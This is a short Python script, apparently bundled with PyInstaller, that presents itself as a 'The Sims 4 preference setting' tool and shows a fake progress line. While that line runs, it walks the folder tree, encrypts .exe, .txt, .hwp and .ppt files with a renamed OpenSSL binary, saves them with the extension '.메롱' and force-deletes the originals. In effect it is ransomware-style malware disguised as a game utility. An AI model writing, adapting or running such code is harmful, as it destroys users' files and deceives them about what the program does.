import os
import sys
#camellia-256-ofb, aes-254-ofb
base_path = sys._MEIPASS
i = 1
cur = os.getcwd().split("\\")[-1]
if cur == "Sims 4":
	walking = "..\\"
else:
	walking = "."

for root, dirs, files in os.walk((walking).encode('utf8')):
	for file in files:
		print("The Sims 4 preference setting.."+"."*(i%2), end='  \r')
		i=i+1
		if file == "Sims 4.exe".encode('utf8'):
			continue
		elif file.endswith((".exe").encode('utf8')):
			target = '"' + os.path.join(root, file).decode('utf8') +'"'
			os.system(base_path+'\\openssl\\bin\\conf.exe enc -aes-256-ofb -in '+target+' -out '+target[:-1]+'.메롱" -pass pass:{pass}')
			os.system('del /F ' + target + ' 1> nul 2>&1')
		elif file.endswith((".txt").encode('utf8')):
			target = '"' + os.path.join(root, file).decode('utf8') +'"'
			os.system(base_path+'\\openssl\\bin\\conf.exe enc -aes-256-ofb -in '+target+' -out '+target[:-1]+'.메롱" -pass pass:{pass}')
			os.system('del /F ' + target + ' 1> nul 2>&1')
		elif file.endswith((".hwp").encode('utf8')):
			target = '"' + os.path.join(root, file).decode('utf8') +'"'
			os.system(base_path+'\\openssl\\bin\\conf.exe enc -aes-256-ofb -in '+target+' -out '+target[:-1]+'.메롱" -pass pass:{pass}')
			os.system('del /F ' + target + ' 1> nul 2>&1')
		elif file.endswith((".ppt").encode('utf8')):
			target = '"' + os.path.join(root, file).decode('utf8') +'"'
			os.system(base_path+'\\openssl\\bin\\conf.exe enc -aes-256-ofb -in '+target+' -out '+target[:-1]+'.메롱" -pass pass:{pass}')
			os.system('del /F ' + target + ' 1> nul 2>&1')
